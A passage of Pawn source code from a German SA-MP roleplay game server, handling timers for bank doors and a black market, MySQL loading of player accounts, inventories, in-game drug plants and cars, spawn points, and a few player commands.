		        Schwarzmarkt[x][sBesitzerKills] = 0;
		        Fraktionskasse[besitzer]+=2500.0;
		        Frakkassespeichern(besitzer);
		        new string2[3];
		        format(string,sizeof string,"ID='%d'",x);
		        format(string2,sizeof string2,"%d",Schwarzmarkt[x][sBesitzer]);
		        mysqlupdate("schwarzmarkt",string,"Besitzer",string2);
		    }
		    else
		    {
		        format(string,sizeof string,"Schwarzmarkt erfolgreich verteidigt. %d - %d Kills",Schwarzmarkt[x][sBesitzerKills],Schwarzmarkt[x][sAngreiferKills]);
				FraktionsNachricht(Schwarzmarkt[x][sBesitzer],COLOR_LIGHTBLUE,string);
				format(string,sizeof string,"Schwarzmarkt nicht eingenommen. %d - %d Kills",Schwarzmarkt[x][sBesitzerKills],Schwarzmarkt[x][sAngreiferKills]);
				FraktionsNachricht(Schwarzmarkt[x][sAngreifer],COLOR_LIGHTBLUE,string);
		        Schwarzmarkt[x][sAngreiferKills] = 0;
		        Schwarzmarkt[x][sBesitzerKills] = 0;
		    }
   		  	Schwarzmarkt[x][sAngreifer] = -1;
		}
	}
	if(banktuerexplodee >= 0 && Banktimer2 == 0 && bankdarf == 0)
	{
	    banktuerexplodee --;
	}
	else if(banktuerexplodee < 0 && Banktimer2 == 0 && bankdarf == 0)
	{
	    bankdarf = 1;
	    banktuerexplodee = 0;
 		CreateExplosion(1592.6671,-8549.5918,2.3310, 6, 14.0);
	    DestroyObject(Banktuerls);
	    Banktimer2 = 1;
	    SetTimer("NewDoor2",1000*60*15,0);
	}
	if(tuersetzen1 == 1 && tuertimer1 < 1)
	{
	 	TraegerTur[0] = CreateDynamicObject(19799, 1427.43787, -7537.79297, 19.24610,   0.00000, 0.00000, 90.00000);
	 	tuersetzen1 = 0;
	 	tresordarf = 0;
	}
	if(tuersetzen1 == 1 && tuertimer1 > 0)
	{
	    tuertimer1 --;
	}
	if(tuersetzen2 == 1 && tuertimer2 < 1)
	{
	 	TraegerTur[1] = CreateDynamicObject(19799, 1428.59412, -7541.41357, 12.19320,   0.00000, 0.00000, 0.00000);
	 	tuersetzen2 = 0;
	 	tresordarf = 0;
	}
	if(tuersetzen2 == 1 && tuertimer2 > 0)
	{
	    tuertimer2 --;
	}
	if(tuersetzen3 == 1 && tuertimer3 < 1)
	{
	 	TraegerTur[2] = CreateDynamicObject(19799, 1429.62158, -7577.70264, 4.17059,   0.00000, 0.00000, 180.00000);
	 	tuersetzen3 = 0;
	 	tresordarf = 0;
	}
	if(tuersetzen3 == 1 && tuertimer3 > 0)
	{
	    tuertimer3 --;
	}
	if(tuersetzen4 == 1 && tuertimer4 < 1)
	{
	    DestroyDynamicObject(Tresortuer);
	 	Tresortuer = CreateDynamicObject(19619, 1436.43591, -7563.22510, 11.88010,   0.00000, 0.00000, 180.00000);
	 	tuersetzen4 = 0;
	 	tresordarf = 0;
	 	zunderklauen = 0;
	}
	if(tuersetzen4 == 1 && tuertimer4 > 0)
	{
	    tuertimer4 --;
	}
	for(new b = 0; b < sizeof(baume); b++)
    {
        if(Baumstatus[b] == 0)
        {
            if(baumsekunde[b] == 300)
            {
    			Baumholz[b] = CreateDynamicObjectEx(673,baume[b][0],baume[b][1],baume[b][2],0,0,0,150.0,150.0);
			    Baumstatus[b] = 1;
			    Baumleben[b] = 1000;
			    baumsekunde[b] = 0;
            }
            else
            {
                baumsekunde[b] += 1;
            }
        }
    }
	return 1;
}

forward TazerBereitForPlayer(playerid);
public TazerBereitForPlayer(playerid)
{
	TazerBereit[playerid] = 1;
	return 1;
}
KontoGeld(playerid,Float:value,const Grund[50])
{
	SpielerInfo[playerid][uKonto] += value;
	new string[150];
	format(string,sizeof string,"INSERT INTO `kontolog` SET ID='%d',Betrag='%.2f',Zweck='%s',Zeit='%d'",SpielerInfo[playerid][uID],value,Grund,gettime());
	mysql_query(dbhandle, string);
	printf("%s",string);
}
forward GebeGeld(playerid,Float:value);
public GebeGeld(playerid,Float:value)
{
	new string[12];
	SpielerInfo[playerid][uGeld] += value;
	if(SpielerInfo[playerid][uGeld] >= 0) format(string,sizeof string,"%.2f",SpielerInfo[playerid][uGeld]);
	else format(string,sizeof string,"~R~%.2f",SpielerInfo[playerid][uGeld]);
	PlayerTextDrawSetString(playerid,GeldAnzeigewert[playerid],string);
}
forward AccountLaden(playerid);
public AccountLaden(playerid)
{
	new data[128],string[100], inte, Float:floa;
	format(string,sizeof string,"SELECT * FROM user WHERE userID='%d'",SpielerInfo[playerid][uID]);
	mysql_query(dbhandle, string, true);
	printf("%s",string);
	inte = cache_get_field_content_int(0, "Leiter");
	SpielerInfo[playerid][uLeiter] = inte;
	inte = cache_get_field_content_int(0, "Mitglied");
	SpielerInfo[playerid][uMitglied] = inte;
	inte = cache_get_field_content_int(0, "Rang");
	SpielerInfo[playerid][uRang] = inte;
	inte = cache_get_field_content_int(0, "Exp");
	SpielerInfo[playerid][uEXP] = inte;
	inte = cache_get_field_content_int(0, "Admin");
	SpielerInfo[playerid][uAdmin] = inte;
	inte = cache_get_field_content_int(0, "ZiviSkin");
	SpielerInfo[playerid][uZiviSkin] = inte;
	inte = cache_get_field_content_int(0, "ZiviFrak");
	SpielerInfo[playerid][uZiviFrak] = inte;
	floa = cache_get_field_content_float(0, "Geld");
	SpielerInfo[playerid][uGeld] = 0.00;
	GebeGeld(playerid,floa);
	floa = cache_get_field_content_float(0, "Konto");
	SpielerInfo[playerid][uKonto] = floa;
	inte = cache_get_field_content_int(0, "Job");
	SpielerInfo[playerid][uJob] = inte;
	inte = cache_get_field_content_int(0, "Punkte");
	SpielerInfo[playerid][upunkte] = inte;
	inte = cache_get_field_content_int(0, "Ban");
	SpielerInfo[playerid][uBan] = inte;
	inte = cache_get_field_content_int(0, "Jahr");
	SpielerInfo[playerid][uJahr] = inte;
	inte = cache_get_field_content_int(0, "Tag");
	SpielerInfo[playerid][uTag] = inte;
	inte = cache_get_field_content_int(0, "Monat");
	SpielerInfo[playerid][uMonat] = inte;
	inte = cache_get_field_content_int(0, "Strafe");
	SpielerInfo[playerid][uStrafe] = inte;
	inte = cache_get_field_content_int(0, "StrafCP");
	SpielerInfo[playerid][uStrafCP] = inte;
	inte = cache_get_field_content_int(0, "Tutorial");
	SpielerInfo[playerid][uTutorial] = inte;
	inte = cache_get_field_content_int(0, "Repair");
	SpielerInfo[playerid][uRepair] = inte;
	inte = cache_get_field_content_int(0, "Level");
	SetPlayerScore(playerid,inte);
	floa = cache_get_field_content_float(0, "X");
	SpielerInfo[playerid][uPosX] = floa;
	floa = cache_get_field_content_float(0, "Y");
	SpielerInfo[playerid][uPosY] = floa;
	floa = cache_get_field_content_float(0, "Z");
	SpielerInfo[playerid][uPosZ] = floa;
	inte = cache_get_field_content_int(0, "Perso");
	SpielerInfo[playerid][uPerso] = inte;
	inte = cache_get_field_content_int(0, "Skin");
	SpielerInfo[playerid][uSkin] = inte;
	inte = cache_get_field_content_int(0, "Geschlecht");
	SpielerInfo[playerid][uGeschlecht] = inte;
	inte = cache_get_field_content_int(0, "Level");
	SpielerInfo[playerid][uLevel] = inte;
	SetPlayerScore(playerid,SpielerInfo[playerid][uLevel]);
	cache_get_field_content(0, "Scheine",data);
	new scheinstring[2];
	strmid(scheinstring, data, 0, 1);
	SpielerInfo[playerid][uFuehrerschein] = strval(scheinstring);
	strmid(scheinstring, data, 1, 2);
	SpielerInfo[playerid][uMotorradschein] = strval(scheinstring);
	strmid(scheinstring, data, 2, 3);
	SpielerInfo[playerid][uRollerschein] = strval(scheinstring);
	strmid(scheinstring, data, 3, 4);
	SpielerInfo[playerid][uBootsschein] = strval(scheinstring);
	strmid(scheinstring, data, 4, 5);
	SpielerInfo[playerid][uHelischein] = strval(scheinstring);
	strmid(scheinstring, data, 5, 6);
	SpielerInfo[playerid][uLKWschein] = strval(scheinstring);
	strmid(scheinstring, data, 6, 7);
	SpielerInfo[playerid][uWaffenschein] = strval(scheinstring);
	strmid(scheinstring, data, 7, 8  );
	SpielerInfo[playerid][uTheorie] = strval(scheinstring);
	cache_get_field_content(0, "Missionen",data);
	new missionenstring[2];
	strmid(missionenstring, data, 0, 1);
	SpielerInfo[playerid][ufMissionen] = strval(missionenstring);
	strmid(missionenstring, data, 1, 2);
	SpielerInfo[playerid][ufBeruf] = strval(missionenstring);
	strmid(missionenstring, data, 2, 3);
	SpielerInfo[playerid][ufATM] = strval(missionenstring);
	strmid(missionenstring, data, 3, 4);
	SpielerInfo[playerid][ufAutokauf] = strval(missionenstring);
	strmid(missionenstring, data, 4, 5);
	SpielerInfo[playerid][ufShop] = strval(missionenstring);
	strmid(missionenstring, data, 5, 6);
	SpielerInfo[playerid][ufHandy] = strval(missionenstring);
	strmid(missionenstring, data, 6, 7);
	SpielerInfo[playerid][ufAngel] = strval(missionenstring);
	strmid(missionenstring, data, 7, 8);
	SpielerInfo[playerid][ufMarkt] = strval(missionenstring);
	strmid(missionenstring, data, 8, 9);
	SpielerInfo[playerid][ufGras] = strval(missionenstring);
	strmid(missionenstring, data, 9, 10);
	SpielerInfo[playerid][ufSchwarz] = strval(missionenstring);
	strmid(missionenstring, data, 10, 11);
	SpielerInfo[playerid][ufBombe] = strval(missionenstring);
	strmid(missionenstring, data, 11, 12);
	SpielerInfo[playerid][ufWaffenschein] = strval(missionenstring);
	strmid(missionenstring, data, 12, 13);
	SpielerInfo[playerid][ufFuhrerschein] = strval(missionenstring);
	strmid(missionenstring, data, 13, 14);
	SpielerInfo[playerid][ufPerso] = strval(missionenstring);
	inte = cache_get_field_content_int(0, "Hausschlüssel");
	SpielerInfo[playerid][uHausschluessel] = inte;
	inte = cache_get_field_content_int(0, "Geschäftschlüssel");
	SpielerInfo[playerid][uGeschaeftschluessel] = inte;
	inte = cache_get_field_content_int(0, "Grundwehrdienst");
	SpielerInfo[playerid][uGWD] = inte;
	inte = cache_get_field_content_int(0, "Startbonus");
	SpielerInfo[playerid][uStartbonus] = inte;
	inte = cache_get_field_content_int(0, "Angelnerlaubt1");
	SpielerInfo[playerid][uAngelnerlaubt] = inte;
	inte = cache_get_field_content_int(0, "Angelnerlaubt2");
	SpielerInfo[playerid][uAngelnerlaubt2] = inte;
	inte = cache_get_field_content_int(0, "starttut");
	SpielerInfo[playerid][ustarttut] = inte;
	inte = cache_get_field_content_int(0, "PaydaySekunden");
	SpielerInfo[playerid][uPayDaySekunden] = inte;
	inte = cache_get_field_content_int(0, "Knastzeit");
	SpielerInfo[playerid][uKnastZeit] = inte;
	inte = cache_get_field_content_int(0, "Gefangen");
	SpielerInfo[playerid][uGefangen] = inte;
	inte = cache_get_field_content_int(0, "Kredit");
	SpielerInfo[playerid][uKredit] = inte;
	floa = cache_get_field_content_float(0, "Kreditsumme");
	Kreditsumme[playerid] = floa;
	inte = cache_get_field_content_int(0, "Kreditrate");
	Kreditrate[playerid] = inte;
	inte = cache_get_field_content_int(0, "WantedLevel");
	SpielerInfo[playerid][uWantedLevel] = inte;
	inte = cache_get_field_content_int(0, "Warns");
	SpielerInfo[playerid][uWarns] = inte;
	inte = cache_get_field_content_int(0, "Tode");
	SpielerInfo[playerid][uTode] = inte;
	inte = cache_get_field_content_int(0, "Kills");
	SpielerInfo[playerid][uKills] = inte;
	inte = cache_get_field_content_int(0, "Arbeitslosengeld");
	SpielerInfo[playerid][uArbeitslosengeld] = inte;
	inte = cache_get_field_content_int(0, "Telefonbuch");
	SpielerInfo[playerid][uTelefonbuch] = inte;
	inte = cache_get_field_content_int(0, "Telefonbucheintrag");
	SpielerInfo[playerid][uTelefonbucheintrag] = inte;
	inte = cache_get_field_content_int(0, "Handy");
	SpielerInfo[playerid][uHandy] = inte;
	inte = cache_get_field_content_int(0, "Handynummer");
	SpielerInfo[playerid][uHandynummer] = inte;
	inte = cache_get_field_content_int(0, "Tod");
	SpielerInfo[playerid][uTod] = inte;
	inte = cache_get_field_content_int(0, "Missiong");
	SpielerInfo[playerid][uMissionen] = inte;
	inte = cache_get_field_content_int(0, "Spawn");
	SpielerInfo[playerid][uSpawn] = inte;
	inte = cache_get_field_content_int(0, "Werbunguser");
	SpielerInfo[playerid][uWerbunguser] = inte;
	inte = cache_get_field_content_int(0, "Verstrahlt");
	SpielerInfo[playerid][uVerstrahlt] = inte;
	//Streamer_UpdateEx(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]); uWerbunguser
	Streamer_UpdateEx(playerid,1758.1672,-9324.1094,4.4184);
	format(string,sizeof string,"SELECT * FROM moebel WHERE ID='%d'",SpielerInfo[playerid][uID]);
	mysql_query(dbhandle, string, true);

	printf("%s",string);
	for(new x = 0; x < 100; x++)
	{
	    Inventar[playerid][x] = -1;
	}
	new tint[2];
	for(new i=0; i<cache_num_rows(); i++)
	{
	    tint[0]= cache_get_field_content_int(i, "Nummer");
	    tint[1]= cache_get_field_content_int(i, "Modell");
	    Inventar[playerid][tint[0]] = tint[1];
	}
	for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	{
	    SpielerInventar[playerid][x][0] = -1;
	    SpielerInventar[playerid][x][1] = 0;
	}
	format(string,sizeof string,"SELECT * FROM inventar WHERE ID='%d'",SpielerInfo[playerid][uID]);
	mysql_query(dbhandle, string, true);
	printf("%s",string);
	new nummer;
	for(new i=0; i<cache_num_rows(); i++)
	{
	    nummer= cache_get_field_content_int(i, "Nummer");
	    tint[1]= cache_get_field_content_int(i, "InventarID");
	    SpielerInventar[playerid][nummer][0] = tint[1];

	    tint[0]= cache_get_field_content_int(i, "Anzahl",tint[0]);
	    SpielerInventar[playerid][nummer][1] = tint[0];
	}
	new eeename[MAX_PLAYER_NAME];
	GetPlayerName(playerid,eeename,sizeof(eeename));
	//Drogen
	CDrogen[playerid][drogenid] = -1;
	CDrogen[playerid][drogenzeit] = 0;
	CDrogen[playerid][dX] = 0;
	CDrogen[playerid][dY] = 0;
	CDrogen[playerid][dZ] = 0;
	format(string,sizeof string,"SELECT * FROM drogen WHERE drogenid='%d'",SpielerInfo[playerid][uID]);
	mysql_query(dbhandle, string, true);
	printf("%s",string);
	new Float:ffloat;
	for(new i=0; i<cache_num_rows(); i++)
	{
	    new str[150];
	    tint[0]= cache_get_field_content_int(i, "drogenid");
	    CDrogen[playerid][drogenid] = tint[0];
	    tint[0]= cache_get_field_content_int(i, "drogenzeit");
	    CDrogen[playerid][drogenzeit] = tint[0];
	    ffloat = cache_get_field_content_float(i, "dX");
		CDrogen[playerid][dX] = ffloat;
		ffloat = cache_get_field_content_float(i, "dY");
		CDrogen[playerid][dY] = ffloat;
		ffloat = cache_get_field_content_float(i, "dZ");
		CDrogen[playerid][dZ] = ffloat;
	    if(CDrogen[playerid][drogenzeit] >= 0 && CDrogen[playerid][drogenid] == SpielerInfo[playerid][uID])
	    {
	        format(str,sizeof(str),"{FF5000}Drogenpflanze{FAFAFA}\n\nBesitzer: %s %d/60 Minuten",eeename,CDrogen[playerid][drogenzeit]);
	        CDrogen[playerid][drogenlabel] = Create3DTextLabel(str,COLOR_RED,CDrogen[playerid][dX],CDrogen[playerid][dY],CDrogen[playerid][dZ],5.0,0,1);
	        pfltimer[playerid] = SetTimerEx("Drogensys",60000,0,"d",playerid);
	        CDrogen[playerid][drogenobject] = CreateDynamicObjectEx(19473,CDrogen[playerid][dX],CDrogen[playerid][dY],CDrogen[playerid][dZ]-1.5,0,0,0,150,150);
	        printf("%d",CDrogen[playerid][drogenid]);
	    }
	}
	TogglePlayerSpectating(playerid,false);
	TextDrawShowForPlayer(playerid, Hunger_box);
	TextDrawShowForPlayer(playerid, Hunger_box2);
	PlayerTextDrawShow(playerid, Hungeranzeige[playerid]);
	GebeLeben(playerid,99.8);
	Autosladen(playerid);
}
forward PlayerSpawnOnPoint(playerid);
public PlayerSpawnOnPoint(playerid)
{
	if(SpielerInfo[playerid][uSpawn] == 0) //Spawn letzte Pos
	{
	    Streamer_UpdateEx(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]);
		Teleport(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]);
	}
	else if(SpielerInfo[playerid][uSpawn] == 1) //spawn LS Motel
	{
	    Streamer_UpdateEx(playerid,1829.1190,-9283.0537,4.4102);
	    Teleport(playerid,1829.1190,-9283.0537,4.4102);
	}
	else if(SpielerInfo[playerid][uSpawn] == 2)// Spawn SF Motel
	{
	    Streamer_UpdateEx(playerid,6374.9956,-7738.0210,4.3759);
        Teleport(playerid,6374.9956,-7738.0210,4.3759);
	}
	else if(SpielerInfo[playerid][uSpawn] == 3)//Haus Spawn
	{
	    Streamer_UpdateEx(playerid,HausInfo[SpielerInfo[playerid][uHausschluessel]][hSpawnX],HausInfo[SpielerInfo[playerid][uHausschluessel]][hSpawnY],HausInfo[SpielerInfo[playerid][uHausschluessel]][hSpawnZ]+1);
        Teleport(playerid,HausInfo[SpielerInfo[playerid][uHausschluessel]][hSpawnX],HausInfo[SpielerInfo[playerid][uHausschluessel]][hSpawnY],HausInfo[SpielerInfo[playerid][uHausschluessel]][hSpawnZ]+1);
	}
	else if(SpielerInfo[playerid][uSpawn] == 4)//Fraktionsspawn
	{
	    if(IstSpielerInFrak(playerid,1))
	    {
	        Streamer_UpdateEx(playerid,1547.1733,-9503.6133,7.1567);
        	Teleport(playerid,1547.1733,-9503.6133,7.1567);
		}
		else if(IstSpielerInFrak(playerid,2))
		{
		    Streamer_UpdateEx(playerid,6507.6318,-7892.2495,4.6186);
		    Teleport(playerid,6507.6318,-7892.2495,4.6186);
		}
		else if(IstSpielerInFrak(playerid,4))
		{
		    Streamer_UpdateEx(playerid,1758.1672,-9324.1094,4.4184);
            Teleport(playerid,1758.1672,-9324.1094,4.4184);
		}
		else if(IstSpielerInFrak(playerid,3))
		{
		    Streamer_UpdateEx(playerid,6459.0610,-7755.6650,4.3736);
            Teleport(playerid,6459.0610,-7755.6650,4.3736);
		}
		else if(IstSpielerInFrak(playerid,7))
		{
		    Streamer_UpdateEx(playerid,1713.4614,-8845.9609,5.2003);
            Teleport(playerid,1713.4614,-8845.9609,5.2003);
		}
		else if(IstSpielerInFrak(playerid,8))
		{
		    Streamer_UpdateEx(playerid,4419.6284,-7621.2588,7.1832);
            Teleport(playerid,4419.6284,-7621.2588,7.1832);
		}
		else if(IstSpielerInFrak(playerid,9))
		{
		    Streamer_UpdateEx(playerid,4221.0908,-7639.0205,5.7251);
            Teleport(playerid,4221.0908,-7639.0205,5.7251);
		}
		else if(IstSpielerInFrak(playerid,10))
		{
		    Streamer_UpdateEx(playerid,6365.9180,-9351.6240,4.4984);
            Teleport(playerid,6365.9180,-9351.6240,4.4984);
		}
		else if(IstSpielerInFrak(playerid,11))
		{
		    Streamer_UpdateEx(playerid,3165.6084,-9237.7773,5.8646);
            Teleport(playerid,3165.6084,-9237.7773,5.8646);
		}
		else if(IstSpielerInFrak(playerid,15))
		{
		    Streamer_UpdateEx(playerid,4576.4229,-8695.6406,4.4048);
            Teleport(playerid,4576.4229,-8695.6406,4.4048);
		}
		else if(IstSpielerInFrak(playerid,16))
		{
		    Streamer_UpdateEx(playerid,6360.8535,-9130.2490,6.5073);
            Teleport(playerid,6360.8535,-9130.2490,6.5073);
		}
		else if(IstSpielerInFrak(playerid,17))
		{
		    Streamer_UpdateEx(playerid,3735.6653,-9336.8818,9.7867);
            Teleport(playerid,3735.6653,-9336.8818,9.7867);
		}
		else
		{
		    Streamer_UpdateEx(playerid,1829.1190,-9283.0537,4.4102);
		    Teleport(playerid,1829.1190,-9283.0537,4.4102);
		}
	}
	else
	{
	    Streamer_UpdateEx(playerid,1829.1190,-9283.0537,4.4102);
	    Teleport(playerid,1829.1190,-9283.0537,4.4102);
	}
}

forward Drogensys(playerid);
public Drogensys(playerid)
{
	new str[150], eeename[MAX_PLAYER_NAME];
	GetPlayerName(playerid,eeename,sizeof(eeename));
	CDrogen[playerid][drogenzeit]--;
	if(CDrogen[playerid][drogenzeit] < 1)
	{
	    if(SpielerInfo[playerid][uStrafe] == -1)
	    {
		    format(str,sizeof(str),"{FF5000}Drogenpflanze{FAFAFA}\n\nBesitzer: %s Benutze /ernten",eeename,CDrogen[playerid][drogenzeit]);
		    Update3DTextLabelText(CDrogen[playerid][drogenlabel], 0xFFFFFFFF, str);
		    CDrogen[playerid][drogenzeit] = 0;
		    SendClientMessage(playerid,COLOR_GREEN,"Deine Pflanze ist fertig. Du kannst sie /ernten (Checkpoint)");
		    SetPlayerCheckpoint(playerid,CDrogen[playerid][dX],CDrogen[playerid][dY],CDrogen[playerid][dZ]-1,3.0);
		    cpaktiv[playerid] = 1;
		}
	}
	else{
	    format(str,sizeof(str),"{FF5000}Drogenpflanze{FAFAFA}\n\nBesitzer: %s %d/60 Minuten",eeename,CDrogen[playerid][drogenzeit]);
	    Update3DTextLabelText(CDrogen[playerid][drogenlabel], 0xFFFFFFFF, str);
	    pfltimer[playerid] = SetTimerEx("Drogensys",60000,0,"d",playerid);
	}
	return 1;
}



stock Autosladen(playerid)
{
	new string[100],data[40];
	format(string,sizeof string,"SELECT * FROM cars WHERE ID='%d'",SpielerInfo[playerid][uID]);
	mysql_query(dbhandle, string, true);
	printf("%s",string);
	new i, int, Float:ffloat;
	for(new x = 0; x < 2; x++) SAuto[playerid][x][sID] = -1;
	for(new u=0; u<cache_num_rows(); u++)
	{
		int = cache_get_field_content_int(u, "Nummer");
		i = int;
		int = cache_get_field_content_int(u, "Model");
		SAuto[playerid][i][sModel] = int;
		int = cache_get_field_content_int(u, "abgeschleppt");
		SAuto[playerid][i][abgeschleppt] = int;
		int = cache_get_field_content_int(u, "reperatur");

		SAuto[playerid][i][sreperatur] = int;
		ffloat = cache_get_field_content_float(u, "Preis");
		SAuto[playerid][i][sPreis] = ffloat;
		ffloat = cache_get_field_content_float(u, "X");
		SAuto[playerid][i][sX] = ffloat;
		ffloat = cache_get_field_content_float(u, "Y");
		SAuto[playerid][i][sY] = ffloat;
		ffloat = cache_get_field_content_float(u, "Z");
		SAuto[playerid][i][sZ] = ffloat;
		ffloat = cache_get_field_content_float(u, "A");
		SAuto[playerid][i][sA] = ffloat;

		int = cache_get_field_content_int(u, "Zustand");
		SAuto[playerid][i][sZustand] = ffloat;
		int = cache_get_field_content_int(u, "Kilometer");
		SAuto[playerid][i][sKilometer] = int;
		int = cache_get_field_content_int(u, "Kilometer");
		SAuto[playerid][i][sKilometer] = int;

		cache_get_field_content(u, "Kennzeichen",data);
		format(SAuto[playerid][i][sKennzeichen],10,"%s",data);

		int = cache_get_field_content_int(u, "nitro");
		SAuto[playerid][i][sNitro] = int;
		int = cache_get_field_content_int(u, "hydraulik");
		SAuto[playerid][i][sHydraulik] = int;
		int = cache_get_field_content_int(u, "Motorschaden");
		SAuto[playerid][i][sMotorschaden] = int;
		int = cache_get_field_content_int(u, "farbe2");
		SAuto[playerid][i][sFarbe2] = int;
		int = cache_get_field_content_int(u, "farbe1");
		SAuto[playerid][i][sFarbe1] = int;
		int = cache_get_field_content_int(u, "Tank");
		SAuto[playerid][i][sTank] = int;
		int = cache_get_field_content_int(u, "autoneu");
		SAuto[playerid][i][sautoneu] = int;
		if(SAuto[playerid][i][sautoneu] == 1)
		{
			if(SAuto[playerid][i][sreperatur] == 0)
			{
				SAuto[playerid][i][sID] = CreateVehicle(SAuto[playerid][i][sModel],SAuto[playerid][i][sX],SAuto[playerid][i][sY],SAuto[playerid][i][sZ],SAuto[playerid][i][sA],SAuto[playerid][i][sFarbe1],SAuto[playerid][i][sFarbe2],-1);
		        SetVehicleNumberPlate(SAuto[playerid][i][sID],SAuto[playerid][i][sKennzeichen]);
				SetVehicleToRespawn(SAuto[playerid][i][sID]);
				Benzin[SAuto[playerid][i][sID]] = AutoDaten[SAuto[playerid][i][sModel]-399][MaxBenzin];
				Meter2[SAuto[playerid][i][sID]] = 0;
				Meter[SAuto[playerid][i][sID]] = SAuto[playerid][i][sKilometer]*250;
				SaveCoords(SAuto[playerid][i][sID]);
				Benzin[SAuto[playerid][i][sID]] = SAuto[playerid][i][sTank];
				new engine, lights, alarm, doors, bonnet, boot, objective;
				GetVehicleParamsEx(SAuto[playerid][i][sID], engine, lights, alarm, doors, bonnet, boot, objective);
				SetVehicleParamsEx(SAuto[playerid][i][sID], engine, lights, alarm, VEHICLE_PARAMS_ON, bonnet, boot, objective);
				AddVehicleComponent(SAuto[playerid][i][sID],SAuto[playerid][i][sNitro]);
				AddVehicleComponent(SAuto[playerid][i][sID],SAuto[playerid][i][sHydraulik]);
    			Motorschaden2[SAuto[playerid][i][sID]] = SAuto[playerid][i][sMotorschaden];
			}
			else
			{
				SAuto[playerid][i][sID] = -2;
				int = cache_get_field_content_int(u, "Kilometer");
				SAuto[playerid][i][sKilometer] = int;
				printf("%i %d %d",i,SAuto[playerid][i][sID],SAuto[playerid][i][sModel]);
			}
		}
		else if(SAuto[playerid][i][sautoneu] == 0 && SAuto[playerid][i][sModel] > 0)
		{
		    print("1");
		    new stringtt[160];
		    print("2");
		    format(stringtt,sizeof(stringtt),"Dein %s wurde automatisch vom System verkauft. Du bekommst den vollen Preis zurück: %.2f",AutoDaten[SAuto[playerid][i][sModel]-399][AutoName],SAuto[playerid][i][sPreis]);
		    SendClientMessage(playerid,COLOR_YELLOW,stringtt);
		    print("3");
		    GebeGeld(playerid,SAuto[playerid][i][sPreis]);
		    print("4");
		    SAuto[playerid][i][sModel] = 0;
		    SAuto[playerid][i][sautoneu] = 0;
			format(string,sizeof string,"DELETE FROM cars WHERE `ID`='%d' AND `Nummer`='%d'",SpielerInfo[playerid][uID],i);
			print("5");
			mysql_query(dbhandle, string);
			printf("%s",string);
			print("6");
		}
	}
	funktionxd(playerid);
	return 1;
}
forward funktionxd(playerid);
public funktionxd(playerid)
{
	if(SAuto[playerid][0][sID] != -1 && SAuto[playerid][0][sID] != -2)
	{
	    Tuningladen(playerid,0);
	}
	if(SAuto[playerid][1][sID] != -1 && SAuto[playerid][1][sID] != -2)
	{
	    Tuningladen(playerid,1);
	}
	return 1;
}

cmd:missionen(playerid,params[])
{
	Missionenanzeige(playerid);
	if(SpielerInfo[playerid][ufMissionen] == 0)
	{
	    SpielerInfo[playerid][ufMissionen] = 1;
		Missionenaktu(playerid);
		SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Nutze /missionen {0080FF}(/missionen)");
		new Float:belohnung;
    	belohnung = 200;
    	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
		GebeGeld(playerid,belohnung);
	}
	return 1;
}
cmd:rangcreate(playerid,params[])
{
	if(SpielerInfo[playerid][uAdmin] == 5)
	{
		new query[300];
		for(new x = 1; x < 18; x++)
		{
		    for(new i = 1; i < 9; i++)
			{
				format(query, sizeof(query), "INSERT INTO frakrang (frakid,rangid,rangname) VALUES (%i, %i,'Rang')",x,i);
				mysql_query(dbhandle, query);
			}
		}
	}
	return 1;
}
cmd:karosse(playerid,params[])
{
    printf("%s karosse",PlayerName(playerid));
    WFrak(playerid);
	if(Mitglied[playerid] != 3 && Mitglied[playerid] != 4) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht beim Towing Service!");
	if(IsPlayerInArea(playerid,1663.6755,-9326.9092,1665.4235,-9321.0439))
	{
	    for(new v = 0; v < MAX_VEHICLES; v++)
		{
			if(IsVehicleInRangeOfPoint(v,4,1664.5542,-9323.8867,6.2029) && Motorschaden2[v] == 1)
			{
			    Motorschaden2[v] = 0;
			    SendClientMessage(playerid,COLOR_GREEN,"Du hast das Fahrzeug erfolgreich repariert!");
			    SendClientMessage(playerid,COLOR_GREEN,"Du erhälst 112.60$!");
			    GebeGeld(playerid,112.60);
				RepairVehicle(v);
    			for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        for(new x = 0; x < 2; x++)
			        {
			            if(v == SAuto[i][x][sID])
			            {
			                SendClientMessage(i,COLOR_GREEN,"Der Motorschaden deines Fahrzeuges wurde repariert, das kostet dich 112.60$");
			                GebeGeld(i,-112.60);
			                return 1;
			            }
			        }
			    }
			}
		}
	}
	else if(IsPlayerInArea(playerid,1672.4417,-9326.9336,1674.3047,-9321.0215))
	{
	    for(new v = 0; v < MAX_VEHICLES; v++)
		{
			if(IsVehicleInRangeOfPoint(v,4,1673.3696,-9323.7793,6.2030) && Motorschaden2[v] == 1)
			{
   				Motorschaden2[v] = 0;
			    SendClientMessage(playerid,COLOR_GREEN,"Du hast das Fahrzeug erfolgreich repariert!");
			    SendClientMessage(playerid,COLOR_GREEN,"Du erhälst 112.60$!");
			    GebeGeld(playerid,112.60);
			    RepairVehicle(v);
    			for(new i = 0; i < MAX_PLAYERS; i++)
			    {
			        for(new x = 0; x < 2; x++)
			        {
			            if(v == SAuto[i][x][sID])
			            {
			                SendClientMessage(i,COLOR_GREEN,"Der Motorschaden deines Fahrzeuges wurde repariert, das kostet dich 112.60$");
			                GebeGeld(i,-112.60);
			                return 1;
			            }
			        }
			    }
			}
		}
	}
	else{SendClientMessage(playerid,COLOR_RED,"Du bist nicht unter der Hebebühne!");}
	return 1;
}
cmd:musikbox(playerid,params[])
{
	new bbbxxx = 0;
	for(new x = 0; x < sizeof(SpielerInventar[]); x++)
	{
	    if(SpielerInventar[playerid][x][0] == 30 || Musikbox[0] == playerid || Musikbox[1] == playerid|| Musikbox[2] == playerid)
	    {
	        bbbxxx++;
	    	ShowPlayerDialog(playerid,DIALOG_BOOM1,DIALOG_STYLE_LIST,"Musikbox","Musikbox platzieren\nMusik ändern\nMusikbox entfernen","Anwenden","Abbrechen");
	    }
	}
